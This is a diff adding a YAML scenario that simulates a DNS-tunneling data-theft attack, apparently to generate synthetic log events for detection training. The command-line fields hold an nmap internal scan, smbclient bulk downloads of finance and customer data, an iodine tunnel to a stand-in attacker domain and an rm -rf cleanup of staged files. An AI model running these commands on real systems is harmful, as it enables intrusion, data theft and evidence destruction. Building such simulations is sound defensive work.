@@ -1,0 +1,328 @@
+# ©AngelaMos | 2026
+# data_exfiltration.yml
+
+name: Data Exfiltration via DNS Tunneling
+description: >
+  Simulates a compromised internal host that performs network
+  reconnaissance via port scanning, accesses sensitive file shares,
+  and exfiltrates data using DNS tunneling with high-entropy TXT
+  queries to an attacker-controlled domain. Based on APT34/OilRig
+  DNSpionage campaign techniques.
+
+mitre_tactics:
+  - TA0007
+  - TA0009
+  - TA0010
+mitre_techniques:
+  - T1046
+  - T1005
+  - T1048.003
+  - T1071.004
+
+events:
+  - delay_seconds: 1.0
+    source_type: endpoint
+    event_type: process_execution
+    source_ip: 10.0.1.50
+    hostname: ws-compromised
+    username: jdoe
+    message: Network scanning tool executed for internal reconnaissance
+    process_name: nmap
+    process_id: 8201
+    parent_process: bash
+    command_line: nmap -sS -p 22,80,443,445,3389,5432 10.0.2.0/24
+    mitre_tactic: TA0007
+    mitre_technique: T1046
+
+  - delay_seconds: 3.0
+    source_type: firewall
+    event_type: port_scan
+    source_ip: 10.0.1.50
+    dest_ip: 10.0.2.10
+    source_port: 41001
+    dest_port: 445
+    hostname: fw-internal-01
+    message: SYN scan detected targeting SMB port
+    action: allow
+    protocol: tcp
+    rule_name: internal-all
+    mitre_tactic: TA0007
+    mitre_technique: T1046
+
+  - delay_seconds: 0.5
+    source_type: firewall
+    event_type: port_scan
+    source_ip: 10.0.1.50
+    dest_ip: 10.0.2.20
+    source_port: 41002
+    dest_port: 5432
+    hostname: fw-internal-01
+    message: SYN scan detected targeting PostgreSQL port
+    action: allow
+    protocol: tcp
+    rule_name: internal-all
+    mitre_tactic: TA0007
+    mitre_technique: T1046
+
+  - delay_seconds: 0.5
+    source_type: firewall
+    event_type: port_scan
+    source_ip: 10.0.1.50
+    dest_ip: 10.0.2.30
+    source_port: 41003
+    dest_port: 3389
+    hostname: fw-internal-01
+    message: SYN scan detected targeting RDP port
+    action: allow
+    protocol: tcp
+    rule_name: internal-all
+    mitre_tactic: TA0007
+    mitre_technique: T1046
+
+  - delay_seconds: 0.5
+    source_type: firewall
+    event_type: port_scan
+    source_ip: 10.0.1.50
+    dest_ip: 10.0.2.40
+    source_port: 41004
+    dest_port: 22
+    hostname: fw-internal-01
+    message: SYN scan detected targeting SSH port
+    action: allow
+    protocol: tcp
+    rule_name: internal-all
+    mitre_tactic: TA0007
+    mitre_technique: T1046
+
+  - delay_seconds: 2.0
+    source_type: ids
+    event_type: ids_alert
+    source_ip: 10.0.1.50
+    dest_ip: 10.0.2.0
+    hostname: ids-sensor-02
+    message: Port scan activity detected from workstation
+    signature_id: 2001219
+    signature_name: ET SCAN Potential Port Scan
+    classification: attempted-recon
+    priority: 2
+    mitre_tactic: TA0007
+    mitre_technique: T1046
+
+  - delay_seconds: 5.0
+    source_type: firewall
+    event_type: connection_allowed
+    source_ip: 10.0.1.50
+    dest_ip: 10.0.2.10
+    source_port: 42301
+    dest_port: 445
+    hostname: fw-internal-01
+    message: SMB connection to file server after reconnaissance
+    action: allow
+    protocol: tcp
+    rule_name: internal-smb
+    mitre_tactic: TA0008
+    mitre_technique: T1021.002
+
+  - delay_seconds: 2.0
+    source_type: endpoint
+    event_type: file_access
+    source_ip: 10.0.1.50
+    hostname: file-server-01
+    username: jdoe
+    message: Bulk access to confidential financial documents
+    process_name: smbclient
+    process_id: 8310
+    parent_process: bash
+    command_line: smbclient //10.0.2.10/Finance -U jdoe -c "recurse ON; prompt OFF; mget *"
+    file_path: //10.0.2.10/Finance/
+    mitre_tactic: TA0009
+    mitre_technique: T1005
+
+  - delay_seconds: 3.0
+    source_type: endpoint
+    event_type: file_access
+    source_ip: 10.0.1.50
+    hostname: file-server-01
+    username: jdoe
+    message: Customer database export accessed
+    process_name: smbclient
+    process_id: 8315
+    parent_process: bash
+    command_line: smbclient //10.0.2.10/Databases -U jdoe -c "get customer_export_2026.sql"
+    file_path: //10.0.2.10/Databases/customer_export_2026.sql
+    mitre_tactic: TA0009
+    mitre_technique: T1005
+
+  - delay_seconds: 3.0
+    source_type: endpoint
+    event_type: process_execution
+    source_ip: 10.0.1.50
+    hostname: ws-compromised
+    username: jdoe
+    message: Collected data compressed for exfiltration staging
+    process_name: tar
+    process_id: 8330
+    parent_process: bash
+    command_line: tar czf /tmp/.data.tar.gz /tmp/exfil/
+    file_path: /tmp/.data.tar.gz
+    mitre_tactic: TA0009
+    mitre_technique: T1560.001
+
+  - delay_seconds: 2.0
+    source_type: endpoint
+    event_type: process_execution
+    source_ip: 10.0.1.50
+    hostname: ws-compromised
+    username: jdoe
+    message: DNS tunneling tool iodine started for exfiltration
+    process_name: iodine
+    process_id: 8345
+    parent_process: bash
+    command_line: iodine -f -P s3cretK3y data.exfil-tunnel.tk 10.0.0.53
+    mitre_tactic: TA0010
+    mitre_technique: T1048.003
+
+  - delay_seconds: 1.0
+    source_type: dns
+    event_type: dns_query
+    source_ip: 10.0.1.50
+    dest_ip: 10.0.0.53
+    hostname: ws-compromised
+    message: DNS tunneling query with high-entropy subdomain encoding
+    query: 4d5a90000300000004000000ffff0000b800.data.exfil-tunnel.tk
+    query_type: TXT
+    response_code: NOERROR
+    mitre_tactic: TA0010
+    mitre_technique: T1048.003
+
+  - delay_seconds: 0.1
+    source_type: dns
+    event_type: dns_query
+    source_ip: 10.0.1.50
+    dest_ip: 10.0.0.53
+    hostname: ws-compromised
+    message: DNS tunneling data chunk transmission
+    query: b8000000000000004000000000000000.data.exfil-tunnel.tk
+    query_type: TXT
+    response_code: NOERROR
+    mitre_tactic: TA0010
+    mitre_technique: T1048.003
+
+  - delay_seconds: 0.1
+    source_type: dns
+    event_type: dns_query
+    source_ip: 10.0.1.50
+    dest_ip: 10.0.0.53
+    hostname: ws-compromised
+    message: DNS tunneling data chunk transmission
+    query: 0e1fba0e00b409cd21b8014ccd215468.data.exfil-tunnel.tk
+    query_type: TXT
+    response_code: NOERROR
+    mitre_tactic: TA0010
+    mitre_technique: T1048.003
+
+  - delay_seconds: 0.1
+    source_type: dns
+    event_type: dns_query
+    source_ip: 10.0.1.50
+    dest_ip: 10.0.0.53
+    hostname: ws-compromised
+    message: DNS tunneling data chunk transmission
+    query: 69732070726f6772616d2063616e6e6f.data.exfil-tunnel.tk
+    query_type: TXT
+    response_code: NOERROR
+    mitre_tactic: TA0010
+    mitre_technique: T1048.003
+
+  - delay_seconds: 0.1
+    source_type: dns
+    event_type: dns_query
+    source_ip: 10.0.1.50
+    dest_ip: 10.0.0.53
+    hostname: ws-compromised
+    message: DNS tunneling data chunk transmission
+    query: 7420626520727566efbfbd206e20444f.data.exfil-tunnel.tk
+    query_type: TXT
+    response_code: NOERROR
+    mitre_tactic: TA0010
+    mitre_technique: T1048.003
+
+  - delay_seconds: 0.1
+    source_type: dns
+    event_type: dns_query
+    source_ip: 10.0.1.50
+    dest_ip: 10.0.0.53
+    hostname: ws-compromised
+    message: DNS tunneling data chunk transmission
+    query: 53206d6f64652e0d0d0a24000000efbf.data.exfil-tunnel.tk
+    query_type: TXT
+    response_code: NOERROR
+    mitre_tactic: TA0010
+    mitre_technique: T1048.003
+
+  - delay_seconds: 0.1
+    source_type: dns
+    event_type: dns_query
+    source_ip: 10.0.1.50
+    dest_ip: 10.0.0.53
+    hostname: ws-compromised
+    message: DNS tunneling data chunk transmission
+    query: bd00000000efbfbdefbfbdefbfbd0000.data.exfil-tunnel.tk
+    query_type: TXT
+    response_code: NOERROR
+    mitre_tactic: TA0010
+    mitre_technique: T1048.003
+
+  - delay_seconds: 0.1
+    source_type: dns
+    event_type: dns_query
+    source_ip: 10.0.1.50
+    dest_ip: 10.0.0.53
+    hostname: ws-compromised
+    message: DNS tunneling data chunk transmission
+    query: efbfbd000000efbfbd000000efbfbd00.data.exfil-tunnel.tk
+    query_type: TXT
+    response_code: NOERROR
+    mitre_tactic: TA0010
+    mitre_technique: T1048.003
+
+  - delay_seconds: 2.0
+    source_type: ids
+    event_type: ids_alert
+    source_ip: 10.0.1.50
+    dest_ip: 10.0.0.53
+    hostname: ids-sensor-01
+    message: DNS tunneling activity detected from excessive TXT queries
+    signature_id: 2027863
+    signature_name: ET DNS Potential DNS Tunneling TXT Query High Frequency
+    classification: policy-violation
+    priority: 1
+    mitre_tactic: TA0010
+    mitre_technique: T1048.003
+
+  - delay_seconds: 3.0
+    source_type: dns
+    event_type: dns_query
+    source_ip: 10.0.1.50
+    dest_ip: 10.0.0.53
+    hostname: ws-compromised
+    message: DNS tunneling final data chunk and session teardown
+    query: efbfbd000000efbfbdff00006efbfbd0.data.exfil-tunnel.tk
+    query_type: TXT
+    response_code: NOERROR
+    mitre_tactic: TA0010
+    mitre_technique: T1048.003
+
+  - delay_seconds: 2.0
+    source_type: endpoint
+    event_type: process_execution
+    source_ip: 10.0.1.50
+    hostname: ws-compromised
+    username: jdoe
+    message: Staged data and tunneling artifacts cleaned up
+    process_name: rm
+    process_id: 8401
+    parent_process: bash
+    command_line: rm -rf /tmp/exfil/ /tmp/.data.tar.gz
+    mitre_tactic: TA0005
+    mitre_technique: T1070.004
